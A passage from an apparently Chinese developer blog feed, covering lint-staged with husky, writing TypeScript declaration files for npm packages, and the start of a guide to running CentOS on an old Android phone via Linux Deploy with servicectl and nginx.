husky、eslint、prettier 一起工作。</p><p>首先需要安装 lint-staged：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install lint-staged --save-dev</span><br></pre></td></tr></table></figure><p>之后配置 eslint 与 prettier，这里不多赘述，再然后在 package.json 中添加 <code>lint-staged</code> 字段，并编写匹配规则与执行脚本，以下为示例：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;lint-staged&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;*.&#123;js,vue,ts&#125;&quot;</span><span class="punctuation">:</span> <span class="string">&quot;eslint --cache --fix&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;*.--write&quot;</span><span class="punctuation">:</span> <span class="string">&quot;prettier --write&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>之后修改 <code>.husky/pre-commit</code> 中执行的指令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">. <span class="string">&quot;<span class="subst">$(dirname <span class="string">&quot;<span class="variable">$0</span>&quot;</span>)</span>/_/husky.sh&quot;</span></span><br><span class="line"></span><br><span class="line">npx lint-staged</span><br></pre></td></tr></table></figure><p>之后每次提交时就会对要提交的代码进行代码风格检查。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 前端工程化 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>为第三方 npm 包编写声明文件</title>
      <link href="/2022/05/5d427e75a94a.html"/>
      <url>/2022/05/5d427e75a94a.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-如何查看当前包是否有现成的声明文件？"><a href="#1-如何查看当前包是否有现成的声明文件？" class="headerlink" title="1.  如何查看当前包是否有现成的声明文件？"></a>1.  如何查看当前包是否有现成的声明文件？</h1><p>在我们尝试给一个 npm 包创建声明文件之前，需要先看看它的声明文件是否已经存在。一般来说，npm 包的声明文件可能存在于两个地方：</p><ol><li>与该 npm 包绑定在一起。判断依据是 <code>package.json</code> 中有 <code>types</code> 字段，或者有一个 <code>index.d.ts</code> 声明文件。这种模式不需要额外安装其他包，是最为推荐的，所以以后我们自己创建 npm 包的时候，最好也将声明文件与 npm 包绑定在一起。</li><li>发布到 <code>@types</code> 里。我们只需要尝试安装一下对应的 <code>@types</code> 包就知道是否存在该声明文件，安装命令是 <code>npm install @types/foo --save-dev</code>。这种模式一般是由于 npm 包的维护者没有提供声明文件，所以只能由其他人将声明文件发布到 <code>@types</code> 里了。</li></ol><h1 id="2-自己编写的声明文件放在哪儿？"><a href="#2-自己编写的声明文件放在哪儿？" class="headerlink" title="2.  自己编写的声明文件放在哪儿？"></a>2.  自己编写的声明文件放在哪儿？</h1><p>假如以上两种方式都没有找到对应的声明文件，那么我们就需要自己为它写声明文件了。由于是通过 <code>import</code> 语句导入的模块，所以声明文件存放的位置也有所约束，一般有两种方案：</p><ol><li>创建一个 <code>node_modules/@types/foo/index.d.ts</code> 文件，存放 <code>foo</code> 模块的声明文件。这种方式不需要额外的配置，但是 <code>node_modules</code> 目录不稳定，代码也没有被保存到仓库中，无法回溯版本，有不小心被删除的风险，故不太建议用这种方案，一般只用作临时测试。</li><li>创建一个 <code>types</code> 目录，专门用来管理自己写的声明文件，将 <code>foo</code> 的声明文件放到 <code>types/foo/index.d.ts</code> 中。这种方式需要配置下 <code>tsconfig.json</code> 中的 <code>paths</code> 和 <code>baseUrl</code> 字段。</li></ol><p>目录结构：</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/path/<span class="keyword">to</span>/project</span><br><span class="line">├── src</span><br><span class="line">|  └── index.ts</span><br><span class="line">├── types</span><br><span class="line">|  └── foo</span><br><span class="line">|     └── index.d.ts</span><br><span class="line">└── tsconfig.json</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>tsconfig.json</code> 内容：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;compilerOptions&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;baseUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;paths&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;*&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;types/*&quot;</span><span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如此配置之后，通过 <code>import</code> 导入 <code>foo</code> 的时候，也会去 <code>types</code> 目录下寻找对应的模块的声明文件了。</p><h1 id="3-编写声明文件"><a href="#3-编写声明文件" class="headerlink" title="3.  编写声明文件"></a>3.  编写声明文件</h1><p>npm 包的声明文件主要有以下几种语法：</p><ul><li><a href="https://ts.xcatliu.com/basics/declaration-files.html#export"><code>export</code></a> 导出变量</li><li><a href="https://ts.xcatliu.com/basics/declaration-files.html#export-namespace"><code>export namespace</code></a> 导出（含有子属性的）对象</li><li><a href="https://ts.xcatliu.com/basics/declaration-files.html#export-default"><code>export default</code></a> ES6 默认导出</li><li><a href="https://ts.xcatliu.com/basics/declaration-files.html#export-1"><code>export =</code></a> commonjs 导出模块</li></ul><h4 id="export§"><a href="#export§" class="headerlink" title="export§"></a><code>export</code><a href="https://ts.xcatliu.com/basics/declaration-files.html#export">§</a></h4><p>npm 包的声明文件与全局变量的声明文件有很大区别。在 npm 包的声明文件中，使用 <code>declare</code> 不再会声明一个全局变量，而只会在当前文件中声明一个局部变量。只有在声明文件中使用 <code>export</code> 导出，然后在使用方 <code>import</code> 导入后，才会应用到这些类型声明。</p><p><code>export</code> 的语法与普通的 ts 中的语法类似，区别仅在于声明文件中禁止定义具体的实现<a href="https://github.com/xcatliu/typescript-tutorial/tree/master/examples/declaration-files/15-export">15</a>：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// types/foo/index.d.ts</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">getName</span>(<span class="params"></span>): <span class="built_in">string</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">name: <span class="built_in">string</span></span>);</span><br><span class="line">    <span class="title function_">sayHi</span>(): <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">enum</span> <span class="title class_">Directions</span> &#123;</span><br><span class="line">    <span class="title class_">Up</span>,</span><br><span class="line">    <span class="title class_">Down</span>,</span><br><span class="line">    <span class="title class_">Left</span>,</span><br><span class="line">    <span class="title class_">Right</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">interface</span> <span class="title class_">Options</span> &#123;</span><br><span class="line">    <span class="attr">data</span>: <span class="built_in">any</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>对应的导入和使用模块应该是这样：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src/index.ts</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; name, getName, <span class="title class_">Animal</span>, <span class="title class_">Directions</span>, <span class="title class_">Options</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;foo&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(name);</span><br><span class="line"><span class="keyword">let</span> myName = <span class="title function_">getName</span>();</span><br><span class="line"><span class="keyword">let</span> cat = <span class="keyword">new</span> <span class="title class_">Animal</span>(<span class="string">&#x27;Tom&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> directions = [<span class="title class_">Directions</span>.<span class="property">Up</span>, <span class="title class_">Directions</span>.<span class="property">Down</span>, <span class="title class_">Directions</span>.<span class="property">Left</span>, <span class="title class_">Directions</span>.<span class="property">Right</span>];</span><br><span class="line"><span class="keyword">let</span> <span class="attr">options</span>: <span class="title class_">Options</span> = &#123;</span><br><span class="line">    <span class="attr">data</span>: &#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&#x27;foo&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="混用-declare-和-export§"><a href="#混用-declare-和-export§" class="headerlink" title="混用 declare 和 export§"></a>混用 <code>declare</code> 和 <code>export</code><a href="https://ts.xcatliu.com/basics/declaration-files.html#%E6%B7%B7%E7%94%A8-declare-%E5%92%8C-export">§</a></h5><p>我们也可以使用 <code>declare</code> 先声明多个变量，最后再用 <code>export</code> 一次性导出。上例的声明文件可以等价的改写为<a href="https://github.com/xcatliu/typescript-tutorial/tree/master/examples/declaration-files/16-declare-and-export">16</a>：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// types/foo/index.d.ts</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">declare</span> <span class="keyword">const</span> <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line"><span class="keyword">declare</span> <span class="keyword">function</span> <span class="title function_">getName</span>(<span class="params"></span>): <span class="built_in">string</span>;</span><br><span class="line"><span class="keyword">declare</span> <span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">name: <span class="built_in">string</span></span>);</span><br><span class="line">    <span class="title function_">sayHi</span>(): <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">declare</span> <span class="keyword">enum</span> <span class="title class_">Directions</span> &#123;</span><br><span class="line">    <span class="title class_">Up</span>,</span><br><span class="line">    <span class="title class_">Down</span>,</span><br><span class="line">    <span class="title class_">Left</span>,</span><br><span class="line">    <span class="title class_">Right</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Options</span> &#123;</span><br><span class="line">    <span class="attr">data</span>: <span class="built_in">any</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> &#123; name, getName, <span class="title class_">Animal</span>, <span class="title class_">Directions</span>, <span class="title class_">Options</span> &#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注意，与全局变量的声明文件类似，<code>interface</code> 前是不需要 <code>declare</code> 的。</p><h4 id="export-namespace§"><a href="#export-namespace§" class="headerlink" title="export namespace§"></a><code>export namespace</code><a href="https://ts.xcatliu.com/basics/declaration-files.html#export-namespace">§</a></h4><p>与 <code>declare namespace</code> 类似，<code>export namespace</code> 用来导出一个拥有子属性的对象<a href="https://github.com/xcatliu/typescript-tutorial/tree/master/examples/declaration-files/17-export-namespace">17</a>：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// types/foo/index.d.ts</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">namespace</span> foo &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">    <span class="keyword">namespace</span> bar &#123;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">baz</span>(<span class="params"></span>): <span class="built_in">string</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src/index.ts</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; foo &#125; <span class="keyword">from</span> <span class="string">&#x27;foo&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">name</span>);</span><br><span class="line">foo.<span class="property">bar</span>.<span class="title function_">baz</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="export-default§"><a href="#export-default§" class="headerlink" title="export default§"></a><code>export default</code><a href="https://ts.xcatliu.com/basics/declaration-files.html#export-default">§</a></h4><p>在 ES6 模块系统中，使用 <code>export default</code> 可以导出一个默认值，使用方可以用 <code>import foo from &#39;foo&#39;</code> 而不是 <code>import &#123; foo &#125; from &#39;foo&#39;</code> 来导入这个默认值。</p><p>在类型声明文件中，<code>export default</code> 用来导出默认值的类型<a href="https://github.com/xcatliu/typescript-tutorial/tree/master/examples/declaration-files/18-export-default">18</a>：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// types/foo/index.d.ts</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>): <span class="built_in">string</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src/index.ts</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> foo <span class="keyword">from</span> <span class="string">&#x27;foo&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">foo</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注意，只有 <code>function</code>、<code>class</code> 和 <code>interface</code> 可以直接默认导出，其他的变量需要先定义出来，再默认导出<a href="https://github.com/xcatliu/typescript-tutorial/tree/master/examples/declaration-files/19-export-default-enum-error">19</a>：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// types/foo/index.d.ts</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">enum</span> <span class="title class_">Directions</span> &#123;</span><br><span class="line"><span class="comment">// ERROR: Expression expected.</span></span><br><span class="line">    <span class="title class_">Up</span>,</span><br><span class="line">    <span class="title class_">Down</span>,</span><br><span class="line">    <span class="title class_">Left</span>,</span><br><span class="line">    <span class="title class_">Right</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上例中 <code>export default enum</code> 是错误的语法，需要使用 <code>declare enum</code> 定义出来，然后使用 <code>export default</code> 导出：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// types/foo/index.d.ts</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">declare</span> <span class="keyword">enum</span> <span class="title class_">Directions</span> &#123;</span><br><span class="line">    <span class="title class_">Up</span>,</span><br><span class="line">    <span class="title class_">Down</span>,</span><br><span class="line">    <span class="title class_">Left</span>,</span><br><span class="line">    <span class="title class_">Right</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">Directions</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>针对这种默认导出，我们一般会将导出语句放在整个声明文件的最前面<a href="https://github.com/xcatliu/typescript-tutorial/tree/master/examples/declaration-files/20-export-default-enum">20</a>：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// types/foo/index.d.ts</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">Directions</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">declare</span> <span class="keyword">enum</span> <span class="title class_">Directions</span> &#123;</span><br><span class="line">    <span class="title class_">Up</span>,</span><br><span class="line">    <span class="title class_">Down</span>,</span><br><span class="line">    <span class="title class_">Left</span>,</span><br><span class="line">    <span class="title class_">Right</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="export-§"><a href="#export-§" class="headerlink" title="export =§"></a><code>export =</code><a href="https://ts.xcatliu.com/basics/declaration-files.html#export-">§</a></h4><p>在 commonjs 规范中，我们用以下方式来导出一个模块：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 整体导出</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = foo;</span><br><span class="line"><span class="comment">// 单个导出</span></span><br><span class="line"><span class="built_in">exports</span>.<span class="property">bar</span> = bar;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在 ts 中，针对这种模块导出，有多种方式可以导入，第一种方式是 <code>const ... = require</code>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 整体导入</span></span><br><span class="line"><span class="keyword">const</span> foo = <span class="built_in">require</span>(<span class="string">&#x27;foo&#x27;</span>);</span><br><span class="line"><span class="comment">// 单个导入</span></span><br><span class="line"><span class="keyword">const</span> bar = <span class="built_in">require</span>(<span class="string">&#x27;foo&#x27;</span>).<span class="property">bar</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>第二种方式是 <code>import ... from</code>，注意针对整体导出，需要使用 <code>import * as</code> 来导入：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 整体导入</span></span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> foo <span class="keyword">from</span> <span class="string">&#x27;foo&#x27;</span>;</span><br><span class="line"><span class="comment">// 单个导入</span></span><br><span class="line"><span class="keyword">import</span> &#123; bar &#125; <span class="keyword">from</span> <span class="string">&#x27;foo&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>第三种方式是 <code>import ... require</code>，这也是 ts 官方推荐的方式：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 整体导入</span></span><br><span class="line"><span class="keyword">import</span> foo = <span class="built_in">require</span>(<span class="string">&#x27;foo&#x27;</span>);</span><br><span class="line"><span class="comment">// 单个导入</span></span><br><span class="line"><span class="keyword">import</span> bar = foo.<span class="property">bar</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>对于这种使用 commonjs 规范的库，假如要为它写类型声明文件的话，就需要使用到 <code>export =</code> 这种语法了<a href="https://github.com/xcatliu/typescript-tutorial/tree/master/examples/declaration-files/21-export-equal">21</a>：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// types/foo/index.d.ts</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> = foo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">declare</span> <span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>): <span class="built_in">string</span>;</span><br><span class="line"><span class="keyword">declare</span> <span class="keyword">namespace</span> foo &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="attr">bar</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>需要注意的是，上例中使用了 <code>export =</code> 之后，就不能再单个导出 <code>export &#123; bar &#125;</code> 了。所以我们通过声明合并，使用 <code>declare namespace foo</code> 来将 <code>bar</code> 合并到 <code>foo</code> 里。</p><p>准确地讲，<code>export =</code> 不仅可以用在声明文件中，也可以用在普通的 ts 文件中。实际上，<code>import ... require</code> 和 <code>export =</code> 都是 ts 为了兼容 AMD 规范和 commonjs 规范而创立的新语法，由于并不常用也不推荐使用，所以这里就不详细介绍了，感兴趣的可以看<a href="https://www.typescriptlang.org/docs/handbook/modules.html#export--and-import--require">官方文档</a>。</p><p>由于很多第三方库是 commonjs 规范的，所以声明文件也就不得不用到 <code>export =</code> 这种语法了。但是还是需要再强调下，相比与 <code>export =</code>，我们更推荐使用 ES6 标准的 <code>export default</code> 和 <code>export</code>。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> Javascript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>不花一分钱，把老旧安卓手机改为Linux服务器，并实现内网穿透</title>
      <link href="/2021/12/abf074494c8f.html"/>
      <url>/2021/12/abf074494c8f.html</url>
      
        <content type="html"><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h1><p>前一阵子，突然想搞个树莓派玩玩，但是一看某宝，之前顶天也就300块钱的树莓派现在竟然四五百起，新款的都到七八百了，闲鱼也都要价要疯了。</p><p>作为不可能多花一分钱给黄牛的我，突然想要家里还有太不用的小米 mix3（淘一台二手手机也比买树莓派强啊），要是能发挥这台手机的性能，那不比树莓派高多了！</p><p>因此经过一番折腾，成功在手机上装上了完整版的 CentOS，并且做了内网穿透，安装了 Home Assistant，并且全程不！花！一！分！钱！</p><p>但是过程还是比较坎坷的，因此整理了一下安装以及内网穿透的流程，在此分享一下。</p><h1 id="1-Linux-Deploy"><a href="#1-Linux-Deploy" class="headerlink" title="1. Linux Deploy"></a>1. Linux Deploy</h1><h2 id="1-1-安装"><a href="#1-1-安装" class="headerlink" title="1.1 安装"></a>1.1 安装</h2><p>Linux Deploy 是一个基于 chroot 让安卓运行完整的 Linux arm 系统的工具，但前提是使用该应用手机必须 Root。</p><blockquote><p>如果你的手机没有 Root，可以使用 Termux，借助 <a href="https://github.com/termux/proot-distro">proot-distro</a> 这个项目来安装 Linux arm 系统。但是笔者这里没有安装成功，从而转向了 Linux Deploy。</p></blockquote><p>除了 Linux Deploy，你还需要安装：</p><ul><li>BusyBox：提供基础的软件包服务（大概吧这点我也不懂），否则 Linux Deploy 可能会安装失败</li><li>Termux：一个安卓终端，可以调用 ssh 连接，也可以用于辅助我们查看一些系统信息</li></ul><p>这里推荐一个视频安装教程（视频里安装的是 Ubuntu，但是本文章全程用的是 Centos）：</p><p><a href="https://www.bilibili.com/video/BV1oA411b7Fb">手机安装linux系统-手机秒变服务器（Linux Deploy）</a></p><p>需要注意以下几点：</p><ul><li>安装过程中保证全程科学上网环境</li><li>一定要分配镜像大小，否则在安装过程中可能会漏装一些系统依赖，导致系统无法启动</li><li>extra/ssh 必须显示 done 才说明系统安装并启动成功了</li><li>如果始终无法启动成功系统，尝试安装别的 Linux 发行版本（笔者这里就无法启动 Ubuntu，但是 Centos 就启动成功了）</li><li>用户名记得设置为 <code>root</code></li></ul><p>安装完成之后，打开 Termux，输入 <code>ip addr | grep inet</code> 获取本机在内网环境下的 IP 地址：</p><p><img src="https://s2.loli.net/2021/12/11/Br3QuSoUg52Fmxd.png" alt=""></p><p>之后就可以使用 ssh 指令连接到 Linux Deploy 启动的系统了，比如我这里就是：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@192.168.0.138</span><br></pre></td></tr></table></figure><p>我们后续的操作都会在终端中进行。</p><h2 id="1-2-chroot-环境下如何使用-systemctl"><a href="#1-2-chroot-环境下如何使用-systemctl" class="headerlink" title="1.2 chroot 环境下如何使用 systemctl"></a>1.2 chroot 环境下如何使用 systemctl</h2><blockquote><p><code>systemctl</code> 服务可以将应用作为系统守护进行，也可以用于设置应用开机自启。</p></blockquote><p>正常来说，我们应该执行 <code>systemctl start &lt;service name&gt;</code> 来启动 service 服务，比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl start nginx # 启动 nginx</span><br><span class="line">systemctl enable nginx # 将 nginx 设置为开机自启</span><br></pre></td></tr></table></figure><p>但是 chroot 环境中无法使用 systemctl，可以用下面的 servicectl 项目代替：</p><p><a href="https://github.com/smaknsk/servicectl">https://github.com/smaknsk/servicectl</a></p><p>首先进行安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/smaknsk/servicectl/archive/1.0.tar.gz</span><br><span class="line">tar -xf 1.0.tar.gz -C /usr/local/lib/</span><br><span class="line">ln -s /usr/local/lib/servicectl-1.0/servicectl /usr/local/bin/servicectl</span><br><span class="line">ln -s /usr/local/lib/servicectl-1.0/serviced /usr/local/bin/serviced</span><br></pre></td></tr></table></figure><p>安装完成之后就可以使用 <code>servicectl</code> 代替所有的 <code>systemctl</code> 指令了。</p><p><code>servicectl</code> 虽然可以帮助我们设置开机自启，但是其本身也必须在系统启动前启动，然后才能拉起所有设置了开机自启的应用。Linux Deploy 的设置中有一个 <code>初始化</code> 选项，开启后 Linux Deploy 在启动系统后会执行一段用户可以编辑的脚本，该脚本的默认位置在 <code>/etc/rc.locl</code>。</p><p>我们首先要在 Linux 系统中为初始化脚本写入执行权限权限：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 /etc/rc.locl</span><br></pre></td></tr></table></figure><p>然后编辑该脚本的内容，向内写入 <code>serviced</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">/etc/rc.locl</span></span><br><span class="line">serviced</span><br></pre></td></tr></table></figure><h1 id="2-内网穿透"><a href="#2-内网穿透" class="headerlink" title="2. 内网穿透"></a>2. 内网穿透</h1><h2 id="2-1-安装-nginx"><a href="#2-1-安装-nginx" class="headerlink" title="2.1 安装 nginx"></a>2.1 安装 nginx</h2><p>安装 nginx 这一步不再多说，基本上都会，安装完成后调用:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 